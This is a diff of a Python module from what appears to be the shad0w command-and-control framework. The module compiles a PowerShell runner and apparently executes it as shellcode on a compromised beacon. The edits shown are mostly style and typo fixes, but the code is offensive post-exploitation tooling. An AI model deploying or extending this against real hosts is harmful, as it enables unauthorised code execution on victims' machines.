@@ -1,5 +1,5 @@
 #
-# Run unmanaged powershell on a session
+# Run unmanaged PowerShell on a session
 #
 
 import os
@@ -11,8 +11,9 @@ import argparse
 
 from lib import shellcode
 
-__description__ = "Run unmanaged powershell on a session"
+__description__ = "Run unmanaged PowerShell on a session"
 __author__ = "@_batsec_"
+__type__ = "module"
 
 # identify the task as shellcode execute
 USERCD_EXEC_ID = 0x3000
@@ -27,20 +28,24 @@ error_list = ""
 # make the command output a bit cleaner
 FIRST_OUTPUT = True
 
-# let argparse error and exit nice
+
 def error(message):
     global ERROR, error_list
     ERROR = True
     error_list += f"\033[0;31m{message}\033[0m\n"
 
+
 def exit(status=0, message=None):
-    if message != None: print(message)
+    if message is not None:
+        print(message)
     return
 
-# little hack but lets us pass the args to donut
+
 class DummyClass(object):
+    # little hack but lets us pass the args to Donut
     def __init__(self):
         pass
+
 
 def psh_callback(shad0w, data):
     global FIRST_OUTPUT
@@ -58,8 +63,10 @@ def psh_callback(shad0w, data):
 
     return ""
 
+
 def encode_string(data):
     return base64.b64encode(data.encode())
+
 
 def random_string():
     rstring = ""
@@ -70,9 +77,11 @@ def random_string():
 
     return rstring
 
+
 def do_copy():
     os.system("cp /root/shad0w/modules/windows/psh/*.cs /root/shad0w/modules/windows/psh/build")
     os.system("cp /root/shad0w/modules/windows/psh/*.dll /root/shad0w/modules/windows/psh/build")
+
 
 def write_args(pwsh):
     do_copy()
@@ -89,6 +98,7 @@ def write_args(pwsh):
     with open("/root/shad0w/modules/windows/psh/build/main.cs", "w") as file:
         file.write(new_file)
 
+
 def compile_binary():
     cwd = os.getcwd()
 
@@ -96,13 +106,14 @@ def compile_binary():
     os.system("mcs /reference:System.Management.Automation.dll -out:psh.exe main.cs")
     os.chdir(cwd)
 
+
 def main(shad0w, args):
 
     raw_args = args
 
     # check we actually have a beacon
     if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
+        shad0w.debug.log("ERROR: No active beacon.", log=True)
         return
 
     # usage examples
@@ -132,9 +143,9 @@ psh --info GetHash
     parse.add_argument("-c", "--command", nargs="+", required=False, help="Powershell command to execute")
     parse.add_argument("-m", "--module", required=False, help="Powershell modules to load")
     parse.add_argument("-l", "--list", required=False, action='store_true', help="List all the available modules")
-    parse.add_argument("-i", "--info", required=False, help="Get infomation on a module")
+    parse.add_argument("-i", "--info", required=False, help="Get information on a module")
 
-    # make sure we dont die from weird args
+    # make sure we don't die from weird args
     try:
         args = parse.parse_args(args[1:])
     except:
@@ -146,7 +157,7 @@ psh --info GetHash
         parse.print_help()
         return
 
-    # kinda a hack to make sure we intergrate nice with the shellcode generator
+    # kind of a hack to make sure we integrate nice with the shellcode generator
     donut_args = DummyClass()
 
     psh_args = ""
